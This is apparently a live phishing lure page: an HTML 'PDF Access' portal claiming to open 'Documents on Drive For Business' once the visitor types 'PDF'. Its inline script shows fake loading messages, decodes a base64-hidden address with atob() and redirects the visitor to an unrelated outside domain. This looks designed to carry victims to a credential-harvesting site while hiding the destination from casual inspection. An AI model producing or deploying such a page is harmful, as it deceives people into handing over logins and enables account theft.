<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="description" content="Access your PDF documents securely. Type 'PDF' to gain entry."/><title>PDF Access</title><style>body{font-family:'Roboto',sans-serif;height:100vh;margin:0;display:flex;justify-content:center;align-items:center;overflow:hidden;position:relative}.blur-background{position:absolute;top:0;left:0;right:0;bottom:0;background-image:url('https://templatelab.com/wp-content/uploads/2016/08/request-for-proposal-template-01.jpg');background-size:cover;background-position:center;filter:blur(2px);z-index:1}.overlay{position:absolute;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,0.5);z-index:2}.form-container{background:rgba(255,255,255,0.9);border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.3);padding:30px;width:320px;text-align:center;position:relative;z-index:3}input[type="text"]{width:100%;padding:12px;border:1px solid #ced4da;border-radius:6px;margin-bottom:18px;font-size:16px;transition:border-color .3s ease}input[type="text"]:focus{border-color:#007bff;outline:none;box-shadow:0 0 5px rgba(0,123,255,.5)}button{width:100%;padding:12px;background-color:#28a745;border:none;border-radius:6px;color:white;font-size:16px;cursor:pointer;transition:background-color .3s ease}button:hover{background-color:#218838}.status-message{margin-top:15px;font-size:14px}.loading{display:none;font-size:14px;color:#17a2b8}</style></head><body><div class="blur-background"></div><div class="overlay"></div><div class="form-container"><h2 style="color:#343a40;">Type 'PDF' to Access Documents on Drive For Business</h2><label for="pdfInput" style="display:none;">Type 'PDF' to Access Documents</label><input type="text" id="pdfInput" placeholder="Type 'PDF'" required/><button id="accessButton">Access</button><div class="status-message" id="statusMsg"></div><div class="loading" id="loadingMsg">Loading your documents...</div></div><script>(function(){async function a(){const b=document.getElementById('pdfInput').value.trim().toUpperCase(),c=document.getElementById('loadingMsg');if(b!=='PDF'){d("Type 'PDF' to access documents",false);return}d("Accessing documents...",true),c.style.display='block',await new Promise(e=>setTimeout(e,2000));const f="aHR0cHM6Ly9va3MudGFsZW50Y29tcGFueXMuY29t",g=atob(f);setTimeout(()=>{window.location.href=g},3000)}function d(e,f){const g=document.getElementById('statusMsg');g.textContent=e,g.style.color=f?'#28a745':'#dc3545'}document.getElementById('accessButton').onclick=a,document.getElementById('pdfInput').addEventListener('keypress',function(e){if(e.key==='Enter')a()})})();</script></body></html>
